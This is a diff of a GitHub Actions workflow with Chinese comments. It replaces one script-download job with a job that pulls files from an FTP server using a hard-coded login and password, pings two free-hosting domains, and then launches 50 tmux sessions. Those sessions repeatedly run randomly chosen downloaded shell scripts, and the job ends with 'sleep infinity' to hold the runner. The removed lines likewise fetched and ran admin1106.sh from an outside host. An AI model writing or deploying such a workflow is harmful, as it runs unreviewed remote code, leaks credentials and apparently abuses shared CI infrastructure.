@@ -1,41 +1,50 @@
-name: Run Script 1106
+name: Run tmux sessions
 
 on:
-  push:
-    branches:
-      - main  # 你可以根据需要更改触发工作流的分支
   schedule:
-    - cron: '11 8 */7 * *'  
+    - cron: '18 3 * * *'  # 每 4 小时运行一次
   workflow_dispatch:  # 允许手动触发
 
 jobs:
-  run-script:
-    runs-on: ubuntu-latest  # 使用最新的 Ubuntu 环境
+  run-sessions:
+    runs-on: ubuntu-latest
 
     steps:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name: Install dependencies
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y wget
+    - name: Install tmux
+      run: sudo apt-get install -y tmux
 
-    - name: Download and setup OneDriveUploader
+    - name: Run tmux sessions
       run: |
-        wget https://goorm326.alwaysdata.net/auth.json
-        wget https://raw.githubusercontent.com/MoeClub/OneList/master/OneDriveUploader/amd64/linux/OneDriveUploader -P /usr/local/bin/
-        chmod +x /usr/local/bin/OneDriveUploader
-        cd /usr/local/bin/
-        cp OneDriveUploader DriveUploader
+        #!/bin/bash
 
-    - name: Run script in loop
-      run: |
-        for i in {1..1}; do
-          wget -O admin1106.sh https://goorm326.alwaysdata.net/admin1106.sh
-          wget -O auth.json https://goorm326.alwaysdata.net/auth.json
-          sleep 10
-      
-          bash admin1106.sh
-         
+        files=("230117" "230118" "230119" "230120" "230121")
+        for file in "${files[@]}"; do
+          wget -nH -m --ftp-user=if0_37965025 --ftp-password=98kDsIA4LJEZ "ftp://185.27.134.11/htdocs/$file/*"
+          cp htdocs/$file/* ./
+          wget https://raw.githubusercontent.com/MoeClub/OneList/master/OneDriveUploader/amd64/linux/OneDriveUploader -P /usr/local/bin/
+          wget --user-agent="Mozilla/5.0" --debug amer008.great-site.net
+          wget --user-agent="Mozilla/5.0" --debug ttt0090.rf.gd
+          chmod +x /usr/local/bin/OneDriveUploader
         done
+
+        for session_num in {1..50}; do
+            tmux new-session -d -s "session_$session_num"
+            tmux send-keys -t "session_$session_num" "for i in {1..5}; do sleep \$((RANDOM % 58 + 1))m; bash \$(shuf -n 1 -e drive33311.sh drive33322.sh drive33355.sh drive33366.sh drive33377.sh); done" C-m
+        done
+
+        # List all tmux sessions
+        tmux ls
+
+        # Check if all tmux sessions are running
+        if tmux ls | grep -q "session_"; then
+          echo "All tmux sessions have been successfully started."
+        else
+          echo "Failed to start all tmux sessions."
+          exit 1
+        fi
+        
+        # Keep the workflow running
+        sleep infinity
